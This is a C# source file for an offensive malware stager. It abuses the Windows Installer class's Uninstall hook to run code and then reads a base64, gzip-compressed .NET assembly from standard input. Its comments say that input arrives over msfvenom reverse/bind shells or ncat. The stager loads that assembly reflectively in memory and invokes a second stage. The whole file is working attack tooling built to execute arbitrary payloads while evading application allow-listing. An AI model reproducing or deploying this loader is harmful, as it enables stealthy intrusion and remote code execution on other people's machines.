using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;

namespace loader
{
	[System.ComponentModel.RunInstaller(true)]
	public class Loader : System.Configuration.Install.Installer
	{
		[DllImport("kernel32.dll", SetLastError = true)]
		private static extern IntPtr GetStdHandle(int nStdHandle);

		public override void Uninstall(System.Collections.IDictionary savedState)
		{
			base.Uninstall(savedState);

			IntPtr hStdIn = GetStdHandle(-11);
			var stdin = new System.IO.StreamReader(new System.IO.FileStream(hStdIn, System.IO.FileAccess.Read, false));
			//var stdin = new System.IO.StreamReader(System.Console.OpenStandardInput());

			System.Console.WriteLine("READY");

			try
			{
				String encoded = "";
				try
				{
					// This works for msfvenom bind/reverse shell payloads
					// but not for nmap ncat
					encoded = stdin.ReadLine();
					System.Console.SetIn(stdin);
				} catch ( Exception e)
                {
					// This works for nmap ncat but not for msfvenom payloads.
					// NOTE: I have no fucking clue why...
					stdin = new System.IO.StreamReader(System.Console.OpenStandardInput());
					encoded = stdin.ReadLine();
                }
				var compressed = System.Convert.FromBase64String(encoded);
				var ms = new System.IO.MemoryStream(compressed);
				var gz = new System.IO.Compression.GZipStream(ms, System.IO.Compression.CompressionMode.Decompress);
				var output_ms = new System.IO.MemoryStream();
				gz.CopyTo(output_ms);
				var assembly = System.Reflection.Assembly.Load(output_ms.ToArray());
				var stagetwo = assembly.CreateInstance("stagetwo.StageTwo");
				stagetwo.GetType().GetMethod("main").Invoke(stagetwo, new object[] { this.GetType().Assembly.Location, stdin });
			}
			catch (Exception e)
			{
				System.Console.WriteLine("E:LDR:EXCEPTION:" + e.Message);
				System.Console.Write(e.ToString());
			}
		}
	}

}
